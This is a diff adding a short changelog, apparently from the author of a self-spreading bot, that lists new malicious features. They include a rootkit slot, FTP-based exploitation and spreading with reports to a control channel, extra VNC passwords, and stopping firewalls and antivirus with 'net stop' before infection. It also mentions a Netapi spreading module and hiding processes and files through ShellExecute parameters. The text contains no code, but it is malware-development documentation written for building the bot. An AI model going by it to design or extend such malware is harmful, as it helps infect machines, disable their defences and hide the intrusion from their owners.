@@ -1,0 +1,16 @@
+Added functionality (by SiNiSTER)
+
+
+Rootkit (add you own and name it ag.exe, mine is priv)
+added flexibility to cftp (CFTPPath)
+added notification to cftp, messages transferchannel when it has exploited a host
+just as ftp commands are being issued
+More vnc passwords
+bot now shuts down many firewalls and a/v software on hosts just before download and infection using net stop via cmd
+
+Netapi spreading (not yet verified to be working)
+
+
+parameters for certain rootkits must be set in main.cpp in call to shellexecute to hide neccessary procs and files
+Nothing too special as of yet but
+More still to come.....
